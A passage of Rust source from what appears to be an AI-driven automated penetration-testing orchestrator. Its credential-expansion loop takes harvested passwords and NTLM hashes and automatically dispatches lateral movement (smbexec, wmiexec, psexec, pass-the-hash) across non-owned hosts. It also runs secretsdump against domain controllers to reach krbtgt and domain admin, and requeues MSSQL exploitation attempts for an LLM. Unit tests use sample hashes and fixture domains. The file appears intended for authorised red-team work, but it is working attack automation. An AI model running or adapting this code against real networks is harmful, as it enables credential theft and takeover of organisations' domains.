//! auto_credential_expansion -- test new credentials across discovered hosts.
//!
//! When new credentials arrive, this automation tries lateral movement
//! (smbexec, wmiexec, psexec) against non-owned hosts. It also tries
//! secretsdump on DCs for ALL credentials (not just admin — the credential
//! access agent determines feasibility).

use std::sync::Arc;
use std::time::Duration;

use redis::AsyncCommands;
use tokio::sync::watch;
use tracing::{debug, info};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Lateral movement techniques to try, in order of stealth preference.
const LATERAL_TECHNIQUES: &[&str] = &["smbexec", "wmiexec", "psexec"];

/// Resolve a credential's `domain` field to an FQDN for downstream
/// comparisons. NetBIOS labels (e.g. `CHILD`) are looked up in
/// `state.netbios_to_fqdn`; if no mapping exists, the lowercase raw
/// value is returned unchanged.
pub(crate) fn resolve_cred_domain(state: &StateInner, raw_domain: &str) -> String {
    let raw = raw_domain.to_lowercase();
    if raw.contains('.') {
        return raw;
    }
    state
        .netbios_to_fqdn
        .get(&raw)
        .or_else(|| state.netbios_to_fqdn.get(&raw_domain.to_uppercase()))
        .map(|fqdn| fqdn.to_lowercase())
        .unwrap_or(raw)
}

/// Resolve a host's domain. Prefer the FQDN suffix of `hostname`; fall back
/// to scanning `state.domain_controllers` for a DC IP match when the host
/// has only a bare IP. Returns `""` when no resolution is possible.
pub(crate) fn resolve_host_domain(state: &StateInner, host: &ares_core::models::Host) -> String {
    let from_hostname = host
        .hostname
        .to_lowercase()
        .split_once('.')
        .map(|x| x.1)
        .unwrap_or("")
        .to_string();
    if !from_hostname.is_empty() {
        return from_hostname;
    }
    state
        .domain_controllers
        .iter()
        .find(|(_, ip)| ip.as_str() == host.ip)
        .map(|(d, _)| d.to_lowercase())
        .unwrap_or_default()
}

/// True when `host_domain` is in the same forest as `cred_domain` —
/// equal, child, or parent. Empty `host_domain` returns false (we don't
/// know the host's domain, so we skip rather than risk cross-domain auth).
pub(crate) fn domain_is_same_or_relative(host_domain: &str, cred_domain: &str) -> bool {
    !host_domain.is_empty()
        && (host_domain == cred_domain
            || host_domain.ends_with(&format!(".{cred_domain}"))
            || cred_domain.ends_with(&format!(".{host_domain}")))
}

/// Collect every non-owned host IP whose resolved domain is in the same
/// forest as `cred_domain`.
pub(crate) fn find_lateral_targets_for_cred_domain(
    state: &StateInner,
    cred_domain: &str,
) -> Vec<String> {
    state
        .hosts
        .iter()
        .filter(|h| !h.owned)
        .filter(|h| {
            let host_domain = resolve_host_domain(state, h);
            domain_is_same_or_relative(&host_domain, cred_domain)
        })
        .map(|h| h.ip.clone())
        .collect()
}

/// Collect every DC IP whose domain is in the same forest as `cred_domain`.
/// Parent creds are valid for child-domain DCs, so child entries are included.
pub(crate) fn find_dc_ips_for_cred_domain(state: &StateInner, cred_domain: &str) -> Vec<String> {
    state
        .domain_controllers
        .iter()
        .filter(|(domain, _)| {
            let d = domain.to_lowercase();
            d == cred_domain || d.ends_with(&format!(".{cred_domain}"))
        })
        .map(|(_, ip)| ip.clone())
        .collect()
}

/// Build the dedup key for a credential-expansion work item.
pub(crate) fn credential_expansion_dedup_key(cred: &ares_core::models::Credential) -> String {
    format!(
        "{}:{}",
        cred.domain.to_lowercase(),
        cred.username.to_lowercase()
    )
}

/// Snapshot the next batch of credential-expansion work items.
///
/// Filters `state.credentials` for non-admin non-delegation accounts (or
/// any admin), with non-quarantined principals and at least one viable
/// lateral target in the same forest, capping at `max_items`.
///
/// Extracted from the inline closure so the credential-filter + target-
/// resolution rules can be tested against a constructed `StateInner`.
pub(crate) fn select_credential_expansion_work(
    state: &StateInner,
    max_items: usize,
) -> Vec<ExpansionWork> {
    state
        .credentials
        .iter()
        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
        .filter_map(|cred| {
            let dedup = credential_expansion_dedup_key(cred);
            if state.is_processed(DEDUP_EXPANSION_CREDS, &dedup) {
                return None;
            }
            let cred_domain = resolve_cred_domain(state, &cred.domain);
            if state.is_domain_dominated(&cred_domain) {
                return None;
            }
            let targets = find_lateral_targets_for_cred_domain(state, &cred_domain);
            if targets.is_empty() {
                return None;
            }
            let dc_ips = find_dc_ips_for_cred_domain(state, &cred_domain);
            Some(ExpansionWork {
                dedup_key: dedup,
                credential: cred.clone(),
                targets,
                dc_ips,
                is_admin: cred.is_admin,
            })
        })
        .take(max_items)
        .collect()
}

/// Build the dedup key for a pass-the-hash expansion work item.
///
/// The hash's first 32 hex characters (truncated if shorter) are folded in
/// to disambiguate rotations of the same principal — different NTLM hash =
/// different attempt.
pub(crate) fn hash_expansion_dedup_key(hash: &ares_core::models::Hash) -> String {
    format!(
        "{}:{}:{}",
        hash.domain.to_lowercase(),
        hash.username.to_lowercase(),
        &hash.hash_value[..32.min(hash.hash_value.len())]
    )
}

/// Build a `Credential` for pass-the-hash dispatch from an NTLM hash. The
/// hash value goes into the `password` slot, matching the convention
/// downstream `request_lateral` / `request_secretsdump` consume.
pub(crate) fn build_pth_credential(
    hash: &ares_core::models::Hash,
) -> ares_core::models::Credential {
    ares_core::models::Credential {
        id: format!("pth_{}", hash.username),
        username: hash.username.clone(),
        password: hash.hash_value.clone(),
        domain: hash.domain.clone(),
        source: "hash_pth".to_string(),
        discovered_at: None,
        is_admin: false,
        parent_id: None,
        attack_step: 0,
    }
}

/// Snapshot the next batch of hash-expansion work items.
///
/// Filters `state.hashes` for non-`krbtgt`, non-machine NTLM hashes, with
/// at least one same-forest non-owned target host or DC, capping at
/// `max_items`.
pub(crate) fn select_hash_expansion_work(
    state: &StateInner,
    max_items: usize,
) -> Vec<HashExpansionWork> {
    state
        .hashes
        .iter()
        .filter(|h| {
            h.hash_type.to_lowercase() == "ntlm"
                && !h.domain.is_empty()
                && h.username.to_lowercase() != "krbtgt"
                && !h.username.ends_with('$')
        })
        .filter_map(|hash| {
            let dedup = hash_expansion_dedup_key(hash);
            if state.is_processed(DEDUP_HASH_LATERAL, &dedup) {
                return None;
            }
            let hash_domain = resolve_cred_domain(state, &hash.domain);
            if state.is_domain_dominated(&hash_domain) {
                return None;
            }
            let targets = find_lateral_targets_for_cred_domain(state, &hash_domain);
            let dc_ips = find_pth_dc_ips_for_hash(state, &hash_domain);
            if targets.is_empty() && dc_ips.is_empty() {
                return None;
            }
            Some(HashExpansionWork {
                dedup_key: dedup,
                hash: hash.clone(),
                resolved_domain: hash_domain,
                targets,
                dc_ips,
            })
        })
        .take(max_items)
        .collect()
}

/// Collect DCs in the same forest as `hash_domain` for pass-the-hash
/// secretsdump. Cross-forest PTH secretsdump fails at DRSUAPI; this gate
/// keeps the dispatch budget from being wasted on doomed cross-forest
/// attempts.
pub(crate) fn find_pth_dc_ips_for_hash(state: &StateInner, hash_domain: &str) -> Vec<String> {
    let hash_domain = hash_domain.to_lowercase();
    state
        .all_domains_with_dcs()
        .into_iter()
        .filter(|(domain, _)| {
            let d = domain.to_lowercase();
            d == hash_domain || d.ends_with(&format!(".{hash_domain}"))
        })
        .map(|(_, ip)| ip)
        .collect()
}

/// Monitors for new credentials and dispatches lateral movement + secretsdump.
/// Interval: 15s. Enhanced version of the original auto_credential_expansion.
pub async fn auto_credential_expansion(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<ExpansionWork> = {
            let state = dispatcher.state.read().await;

            // Skip only when ALL forests are dominated — DA in one forest
            // must not block credential expansion against undominated forests.
            if state.has_domain_admin && state.all_forests_dominated() {
                continue;
            }

            select_credential_expansion_work(&state, 3)
        };

        for item in work {
            let mut any_dispatched = false;

            // 1. Try secretsdump on DCs FIRST (unless strategy excludes it).
            // Must run before lateral movement to avoid burning
            // CredentialInflight slots on lower-value tasks.
            // Admin creds get priority 2; non-admin get priority 3 (higher
            // than lateral at 5) since secretsdump is the fastest path to
            // krbtgt → DA → golden ticket.
            if !dispatcher.is_technique_allowed("secretsdump") {
                // Skip secretsdump dispatch entirely when strategy excludes it.
                // Fall through to lateral movement and other expansion paths.
            } else {
                for dc_ip in &item.dc_ips {
                    let sd_dedup = format!(
                        "{}:{}:{}",
                        dc_ip,
                        item.credential.domain.to_lowercase(),
                        item.credential.username.to_lowercase()
                    );
                    let already_dumped = {
                        let state = dispatcher.state.read().await;
                        state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
                    };

                    if !already_dumped {
                        let priority = if item.is_admin { 2 } else { 3 };
                        if let Ok(Some(task_id)) = dispatcher
                            .request_secretsdump(dc_ip, &item.credential, priority)
                            .await
                        {
                            any_dispatched = true;
                            debug!(
                                task_id = %task_id,
                                dc = %dc_ip,
                                is_admin = item.is_admin,
                                "Credential secretsdump dispatched"
                            );

                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
                                .await;
                        }
                    }
                }
            } // end else (secretsdump allowed)

            // 2. Try lateral movement on non-DC hosts (up to 5 targets).
            // Runs after secretsdump so the high-value op gets credential
            // inflight slots first.
            let technique = LATERAL_TECHNIQUES[0]; // Start with smbexec
            for target_ip in item.targets.iter().take(5) {
                if let Ok(Some(task_id)) = dispatcher
                    .request_lateral(target_ip, &item.credential, technique)
                    .await
                {
                    any_dispatched = true;
                    debug!(
                        task_id = %task_id,
                        target = %target_ip,
                        technique = technique,
                        username = %item.credential.username,
                        "Credential expansion lateral dispatched"
                    );
                }
            }

            // Only mark as processed if at least one task was actually dispatched.
            // If all tasks were throttled/deferred, retry next cycle.
            if any_dispatched {
                dispatcher
                    .state
                    .write()
                    .await
                    .mark_processed(DEDUP_EXPANSION_CREDS, item.dedup_key.clone());
                let _ = dispatcher
                    .state
                    .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &item.dedup_key)
                    .await;
            }
        }

        // 3. Try hashes for pass-the-hash lateral movement
        let hash_work: Vec<HashExpansionWork> = {
            let state = dispatcher.state.read().await;

            if state.has_domain_admin && state.all_forests_dominated() {
                continue;
            }

            select_hash_expansion_work(&state, 2)
        };

        for item in hash_work {
            let mut any_dispatched = false;

            // Build a credential-like object for pass-the-hash
            let mut pth_cred = build_pth_credential(&item.hash);
            pth_cred.domain = item.resolved_domain.clone();

            for target_ip in item.targets.iter().take(3) {
                if let Ok(Some(task_id)) = dispatcher
                    .request_lateral(target_ip, &pth_cred, "pth_smbclient")
                    .await
                {
                    any_dispatched = true;
                    debug!(
                        task_id = %task_id,
                        target = %target_ip,
                        username = %item.hash.username,
                        "Hash-based lateral dispatched"
                    );
                }
            }

            // 4. Hash→secretsdump: try pass-the-hash secretsdump against DCs.
            // This is the fastest path from hash → krbtgt → DA.
            //
            // Filter DCs to those in the same forest as the hash's domain
            // (exact match or child-of). Cross-forest PTH secretsdump fails
            // at DRSUAPI with `rpc_s_access_denied` and burns a
            // CredentialInflight slot plus ~30k LLM tokens per failed attempt.
            {
                if !dispatcher.is_technique_allowed("secretsdump") {
                    // Strategy excludes secretsdump — skip hash-based expansion too.
                } else {
                    for dc_ip in &item.dc_ips {
                        let sd_dedup = format!(
                            "{}:{}:{}",
                            dc_ip,
                            item.resolved_domain,
                            item.hash.username.to_lowercase()
                        );
                        let already = {
                            let state = dispatcher.state.read().await;
                            state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
                        };
                        if !already {
                            let priority = dispatcher.effective_priority("secretsdump");
                            if let Ok(Some(task_id)) = dispatcher
                                .request_secretsdump(dc_ip, &pth_cred, priority)
                                .await
                            {
                                any_dispatched = true;
                                debug!(
                                    task_id = %task_id,
                                    dc = %dc_ip,
                                    username = %item.hash.username,
                                    "Hash-based secretsdump dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
                                    .await;
                            }
                        }
                    }
                } // end else (secretsdump allowed for hash expansion)
            }

            // Mark once at least one viable same-forest task was dispatched.
            // Per-DC secretsdump dedup remains separate, so a deferred dump can
            // still be attempted by other paths without re-spraying the hash.
            if any_dispatched {
                dispatcher
                    .state
                    .write()
                    .await
                    .mark_processed(DEDUP_HASH_LATERAL, item.dedup_key.clone());
                let _ = dispatcher
                    .state
                    .persist_dedup(&dispatcher.queue, DEDUP_HASH_LATERAL, &item.dedup_key)
                    .await;
            }
        }

        // 5. Re-dispatch unsuccessful mssql_access vulns when a new same-domain
        //    cleartext credential is available. Cross-forest MSSQL pivots fail
        //    if the LLM tries them before any usable cred exists in the linked
        //    server's source forest — once that cred arrives, push the vuln
        //    back into the exploitation ZSET so the LLM gets another shot
        //    with the new credential set in its prompt context.
        let retries = collect_mssql_retries(&dispatcher).await;
        for retry in retries {
            if let Err(e) = requeue_mssql_vuln(&dispatcher, &retry).await {
                debug!(err = %e, vuln_id = %retry.vuln_id, "Failed to requeue mssql_access");
                continue;
            }
            info!(
                vuln_id = %retry.vuln_id,
                cred_user = %retry.cred_user,
                cred_domain = %retry.cred_domain,
                "Re-queued mssql_access for new credential"
            );
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_MSSQL_RETRY, retry.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_MSSQL_RETRY, &retry.dedup_key)
                .await;
        }
    }
}

struct MssqlRetry {
    vuln_id: String,
    vuln_json: String,
    priority: i32,
    cred_user: String,
    cred_domain: String,
    dedup_key: String,
}

/// Walk discovered vulnerabilities for `mssql_access` entries that are not
/// yet exploited and have at least one matching unseen credential. Builds
/// a (vuln, credential) work item with a stable dedup key so the same
/// vuln/cred pair is not re-queued repeatedly.
async fn collect_mssql_retries(dispatcher: &Arc<Dispatcher>) -> Vec<MssqlRetry> {
    let state = dispatcher.state.read().await;
    let mut out = Vec::new();
    for vuln in state.discovered_vulnerabilities.values() {
        if vuln.vuln_type != "mssql_access" {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }
        let vuln_domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();
        for cred in &state.credentials {
            if cred.password.is_empty() || cred.domain.is_empty() {
                continue;
            }
            // Match on domain when the vuln carries one. Otherwise match any
            // cred — the LLM will pick from the prompt's credential list.
            let cred_dom = cred.domain.to_lowercase();
            let matches_domain = vuln_domain.is_empty()
                || cred_dom == vuln_domain
                || cred_dom.ends_with(&format!(".{vuln_domain}"))
                || vuln_domain.ends_with(&format!(".{cred_dom}"));
            if !matches_domain {
                continue;
            }
            let dedup_key = format!(
                "{}:{}:{}",
                vuln.vuln_id,
                cred.username.to_lowercase(),
                cred_dom
            );
            if state.is_processed(DEDUP_MSSQL_RETRY, &dedup_key) {
                continue;
            }
            let Ok(vuln_json) = serde_json::to_string(vuln) else {
                continue;
            };
            out.push(MssqlRetry {
                vuln_id: vuln.vuln_id.clone(),
                vuln_json,
                priority: vuln.priority,
                cred_user: cred.username.clone(),
                cred_domain: cred.domain.clone(),
                dedup_key,
            });
        }
    }
    out
}

/// Push the vuln back into the exploitation ZSET. The exploitation_workflow
/// loop pops by lowest score; reuse the original priority so the retry
/// competes fairly with other work.
async fn requeue_mssql_vuln(
    dispatcher: &Arc<Dispatcher>,
    retry: &MssqlRetry,
) -> anyhow::Result<()> {
    let key = dispatcher.state.vuln_queue_key().await;
    let mut conn = dispatcher.queue.connection();
    let _: () = conn
        .zadd(&key, &retry.vuln_json, retry.priority as f64)
        .await?;
    let _: () = conn.expire(&key, 86400).await.unwrap_or(());
    Ok(())
}

pub(crate) struct ExpansionWork {
    pub dedup_key: String,
    pub credential: ares_core::models::Credential,
    pub targets: Vec<String>,
    pub dc_ips: Vec<String>,
    pub is_admin: bool,
}

pub(crate) struct HashExpansionWork {
    pub dedup_key: String,
    pub hash: ares_core::models::Hash,
    pub resolved_domain: String,
    pub targets: Vec<String>,
    pub dc_ips: Vec<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lateral_techniques_order() {
        // smbexec first (stealthiest), then wmiexec, then psexec
        assert_eq!(LATERAL_TECHNIQUES[0], "smbexec");
        assert_eq!(LATERAL_TECHNIQUES[1], "wmiexec");
        assert_eq!(LATERAL_TECHNIQUES[2], "psexec");
    }

    #[test]
    fn lateral_techniques_count() {
        assert_eq!(LATERAL_TECHNIQUES.len(), 3);
    }

    #[test]
    fn lateral_techniques_contains() {
        assert!(LATERAL_TECHNIQUES.contains(&"smbexec"));
        assert!(LATERAL_TECHNIQUES.contains(&"wmiexec"));
        assert!(LATERAL_TECHNIQUES.contains(&"psexec"));
        assert!(!LATERAL_TECHNIQUES.contains(&"evil-winrm"));
    }

    #[test]
    fn netbios_domain_resolution() {
        // Simulate the NetBIOS→FQDN resolution logic from the automation loop
        let raw = "CHILD";
        let raw_lower = raw.to_lowercase();

        // When netbios_to_fqdn has a mapping, use it
        let mut map = std::collections::HashMap::new();
        map.insert("child".to_string(), "child.contoso.local".to_string());

        let resolved = if !raw_lower.contains('.') {
            map.get(&raw_lower)
                .map(|fqdn| fqdn.to_lowercase())
                .unwrap_or(raw_lower.clone())
        } else {
            raw_lower
        };
        assert_eq!(resolved, "child.contoso.local");

        // When FQDN is already used, pass through
        let fqdn_raw = "contoso.local";
        let fqdn_lower = fqdn_raw.to_lowercase();
        let resolved2 = if !fqdn_lower.contains('.') {
            map.get(&fqdn_lower)
                .map(|fqdn| fqdn.to_lowercase())
                .unwrap_or(fqdn_lower.clone())
        } else {
            fqdn_lower
        };
        assert_eq!(resolved2, "contoso.local");

        // When no mapping exists, use the raw value
        let unknown = "UNKNOWN";
        let unknown_lower = unknown.to_lowercase();
        let resolved3 = if !unknown_lower.contains('.') {
            map.get(&unknown_lower)
                .map(|fqdn| fqdn.to_lowercase())
                .unwrap_or(unknown_lower.clone())
        } else {
            unknown_lower
        };
        assert_eq!(resolved3, "unknown");
    }

    #[test]
    fn domain_matching_logic() {
        // Simulate the host domain matching from credential expansion
        let cred_dom = "contoso.local";

        // Same domain matches
        assert!(
            "contoso.local" == cred_dom
                || "contoso.local".ends_with(&format!(".{cred_dom}"))
                || cred_dom.ends_with(".contoso.local")
        );

        // Child domain matches (child.contoso.local matches cred for contoso.local)
        let host_domain = "child.contoso.local";
        assert!(
            host_domain == cred_dom
                || host_domain.ends_with(&format!(".{cred_dom}"))
                || cred_dom.ends_with(&format!(".{host_domain}"))
        );

        // Parent domain matches (contoso.local matches cred for child.contoso.local)
        let cred_dom2 = "child.contoso.local";
        let host_domain2 = "contoso.local";
        assert!(
            host_domain2 == cred_dom2
                || host_domain2.ends_with(&format!(".{cred_dom2}"))
                || cred_dom2.ends_with(&format!(".{host_domain2}"))
        );

        // Cross-domain does NOT match
        let other_dom = "fabrikam.local";
        assert!(
            !(other_dom == cred_dom
                || other_dom.ends_with(&format!(".{cred_dom}"))
                || cred_dom.ends_with(&format!(".{other_dom}")))
        );
    }

    #[test]
    fn host_domain_from_fqdn() {
        // Simulate extracting domain from FQDN hostname
        let hostname = "dc01.contoso.local";
        let domain = hostname
            .to_lowercase()
            .split_once('.')
            .map(|x| x.1)
            .unwrap_or("")
            .to_string();
        assert_eq!(domain, "contoso.local");

        // Child domain host
        let hostname2 = "dc02.child.contoso.local";
        let domain2 = hostname2
            .to_lowercase()
            .split_once('.')
            .map(|x| x.1)
            .unwrap_or("")
            .to_string();
        assert_eq!(domain2, "child.contoso.local");

        // Short hostname (no domain)
        let hostname3 = "dc01";
        let domain3 = hostname3
            .to_lowercase()
            .split_once('.')
            .map(|x| x.1)
            .unwrap_or("")
            .to_string();
        assert_eq!(domain3, "");
    }

    #[test]
    fn hash_expansion_dedup_key_format() {
        // Test the dedup key format for hash-based expansion
        let domain = "contoso.local";
        let username = "Administrator";
        let hash_value = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0";
        let dedup = format!(
            "{}:{}:{}",
            domain.to_lowercase(),
            username.to_lowercase(),
            &hash_value[..32.min(hash_value.len())]
        );
        assert_eq!(
            dedup,
            "contoso.local:administrator:aad3b435b51404eeaad3b435b51404ee"
        );
    }

    #[test]
    fn pth_credential_building() {
        // Verify that pass-the-hash builds the credential with hash_value as password
        let hash = ares_core::models::Hash {
            id: "hash-1".to_string(),
            username: "jdoe".to_string(),
            hash_value: "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
                .to_string(),
            hash_type: "ntlm".to_string(),
            domain: "contoso.local".to_string(),
            cracked_password: None,
            source: "secretsdump".to_string(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        };
        let pth_cred = ares_core::models::Credential {
            id: format!("pth_{}", hash.username),
            username: hash.username.clone(),
            password: hash.hash_value.clone(),
            domain: hash.domain,
            source: "hash_pth".to_string(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        };
        assert_eq!(pth_cred.id, "pth_jdoe");
        assert_eq!(pth_cred.username, "jdoe");
        assert_eq!(
            pth_cred.password,
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        );
        assert_eq!(pth_cred.domain, "contoso.local");
        assert_eq!(pth_cred.source, "hash_pth");
        assert!(!pth_cred.is_admin);
    }

    #[test]
    fn hash_filter_ntlm_only() {
        // Only NTLM hashes pass the filter; aes/des/lm should be excluded
        let hashes = [
            (
                "ntlm",
                "contoso.local",
                "admin",
                "aad3b435b51404eeaad3b435b51404ee",
            ),
            (
                "NTLM",
                "contoso.local",
                "user1",
                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
            ),
            ("aes256", "contoso.local", "user2", "cccccccc"),
            ("lm", "contoso.local", "user3", "dddddddd"),
        ];
        let filtered: Vec<_> = hashes
            .iter()
            .filter(|(ht, domain, username, _)| {
                ht.to_lowercase() == "ntlm"
                    && !domain.is_empty()
                    && username.to_lowercase() != "krbtgt"
                    && !username.ends_with('$')
            })
            .collect();
        assert_eq!(filtered.len(), 2);
        assert_eq!(filtered[0].2, "admin");
        assert_eq!(filtered[1].2, "user1");
    }

    #[test]
    fn hash_filter_excludes_krbtgt() {
        // krbtgt hashes are excluded from pass-the-hash (used for golden tickets, not PtH)
        let username = "krbtgt";
        let passes = username.to_lowercase() != "krbtgt" && !username.ends_with('$');
        assert!(!passes, "krbtgt should be excluded from hash-based lateral");
    }

    #[test]
    fn hash_filter_excludes_machine_accounts() {
        // Machine accounts (ending with $) are excluded from pass-the-hash
        let usernames = vec!["DC01$", "SQL01$", "WEB01$"];
        for u in usernames {
            assert!(
                u.ends_with('$'),
                "{u} should be detected as machine account"
            );
            let passes = u.to_lowercase() != "krbtgt" && !u.ends_with('$');
            assert!(!passes, "{u} should be excluded from hash expansion");
        }
    }

    #[test]
    fn hash_filter_allows_normal_users() {
        // Normal users should pass the hash filter
        let usernames = vec!["administrator", "jdoe", "svc_sql"];
        for u in usernames {
            let passes = u.to_lowercase() != "krbtgt" && !u.ends_with('$');
            assert!(passes, "{u} should pass the hash filter");
        }
    }

    #[test]
    fn secretsdump_dedup_key_format() {
        // secretsdump dedup: dc_ip:domain:username
        let dc_ip = "192.168.58.10";
        let domain = "CONTOSO.LOCAL";
        let username = "Administrator";
        let sd_dedup = format!(
            "{}:{}:{}",
            dc_ip,
            domain.to_lowercase(),
            username.to_lowercase()
        );
        assert_eq!(sd_dedup, "192.168.58.10:contoso.local:administrator");
    }

    #[test]
    fn secretsdump_dedup_different_dcs_are_unique() {
        // Same credential against different DCs should produce different dedup keys
        let domain = "contoso.local";
        let username = "admin";
        let dedup1 = format!("192.168.58.10:{domain}:{username}");
        let dedup2 = format!("192.168.58.20:{domain}:{username}");
        assert_ne!(dedup1, dedup2);
    }

    #[test]
    fn credential_expansion_dedup_key_format() {
        // Expansion dedup: domain:username
        let domain = "CONTOSO.LOCAL";
        let username = "JDoe";
        let dedup = format!("{}:{}", domain.to_lowercase(), username.to_lowercase());
        assert_eq!(dedup, "contoso.local:jdoe");
    }

    #[test]
    fn credential_filter_empty_domain_excluded() {
        // Credentials with empty domain are excluded
        let creds = [
            ("user1", "P@ss", "contoso.local"),
            ("user2", "P@ss", ""),
            ("user3", "P@ss", "fabrikam.local"),
        ];
        let filtered: Vec<_> = creds
            .iter()
            .filter(|(_, _, domain)| !domain.is_empty())
            .collect();
        assert_eq!(filtered.len(), 2);
        assert_eq!(filtered[0].0, "user1");
        assert_eq!(filtered[1].0, "user3");
    }

    #[test]
    fn credential_filter_empty_password_excluded() {
        // Credentials with empty password are excluded
        let creds = [
            ("user1", "P@ssw0rd!", "contoso.local"), // pragma: allowlist secret
            ("user2", "", "contoso.local"),
            ("user3", "Secret123", "fabrikam.local"), // pragma: allowlist secret
        ];
        let filtered: Vec<_> = creds
            .iter()
            .filter(|(_, password, _)| !password.is_empty())
            .collect();
        assert_eq!(filtered.len(), 2);
        assert_eq!(filtered[0].0, "user1");
        assert_eq!(filtered[1].0, "user3");
    }

    #[test]
    fn target_filtering_owned_hosts_excluded() {
        // Only non-owned hosts are targeted for lateral movement
        let hosts = [
            ("192.168.58.10", true),  // owned - should be excluded
            ("192.168.58.20", false), // not owned - should be included
            ("192.168.58.30", false), // not owned - should be included
            ("192.168.58.40", true),  // owned - should be excluded
        ];
        let targets: Vec<_> = hosts.iter().filter(|(_, owned)| !owned).collect();
        assert_eq!(targets.len(), 2);
        assert_eq!(targets[0].0, "192.168.58.20");
        assert_eq!(targets[1].0, "192.168.58.30");
    }

    #[test]
    fn netbios_resolution_uppercase_fallback() {
        // When lowercase lookup fails, try uppercase
        let mut map = std::collections::HashMap::new();
        map.insert("CONTOSO".to_string(), "contoso.local".to_string());

        let raw = "contoso";
        let raw_lower = raw.to_lowercase();
        let raw_upper = raw.to_uppercase();

        let resolved = if !raw_lower.contains('.') {
            map.get(&raw_lower)
                .or_else(|| map.get(&raw_upper))
                .map(|fqdn| fqdn.to_lowercase())
                .unwrap_or(raw_lower.clone())
        } else {
            raw_lower
        };
        assert_eq!(resolved, "contoso.local");
    }

    #[test]
    fn domain_matching_empty_host_domain_rejected() {
        // Hosts with empty domain should not match any credential domain
        let host_domain = "";
        let cred_dom = "contoso.local";
        let matches = !host_domain.is_empty()
            && (host_domain == cred_dom
                || host_domain.ends_with(&format!(".{cred_dom}"))
                || cred_dom.ends_with(&format!(".{host_domain}")));
        assert!(!matches, "Empty host domain should never match");
    }

    #[test]
    fn domain_matching_sibling_domains_rejected() {
        // Sibling child domains should NOT match each other
        let cred_dom = "child1.contoso.local";
        let host_domain = "child2.contoso.local";
        let matches = host_domain == cred_dom
            || host_domain.ends_with(&format!(".{cred_dom}"))
            || cred_dom.ends_with(&format!(".{host_domain}"));
        assert!(
            !matches,
            "Sibling child domains should not match each other"
        );
    }

    #[test]
    fn hash_dedup_truncates_to_32_chars() {
        // Hash dedup uses first 32 chars of hash_value
        let short_hash = "aabbccdd";
        let long_hash = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0";

        let truncated_short = &short_hash[..32.min(short_hash.len())];
        assert_eq!(truncated_short, "aabbccdd"); // short hash kept as-is

        let truncated_long = &long_hash[..32.min(long_hash.len())];
        assert_eq!(truncated_long, "aad3b435b51404eeaad3b435b51404ee");
    }

    #[test]
    fn host_domain_from_bare_ip_falls_back_to_dc_map() {
        // When hostname has no domain suffix, fall back to domain_controllers map
        let hostname = "192.168.58.10"; // bare IP, no FQDN
        let from_hostname = hostname
            .to_lowercase()
            .split_once('.')
            .map(|x| x.1)
            .unwrap_or("")
            .to_string();
        // For an IP, split_once('.') gives "168.58.10" — not empty but not a valid domain.
        // The real code checks domain_controllers map for IP-based fallback.
        // Here we just verify the hostname parsing returns something unusable for IPs.
        assert_eq!(from_hostname, "168.58.10");

        // A bare hostname without dots returns empty
        let hostname2 = "dc01";
        let from_hostname2 = hostname2
            .to_lowercase()
            .split_once('.')
            .map(|x| x.1)
            .unwrap_or("")
            .to_string();
        assert_eq!(from_hostname2, "");
    }

    // ── tests for extracted pure helpers ──────────────────────────────

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_admin_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        let mut c = make_cred(user, password, domain);
        c.is_admin = true;
        c
    }

    fn make_host(hostname: &str, ip: &str) -> ares_core::models::Host {
        ares_core::models::Host {
            ip: ip.to_string(),
            hostname: hostname.to_string(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        }
    }

    fn make_ntlm_hash(user: &str, value: &str, domain: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-{user}-{domain}"),
            username: user.to_string(),
            hash_value: value.to_string(),
            hash_type: "NTLM".to_string(),
            domain: domain.to_string(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
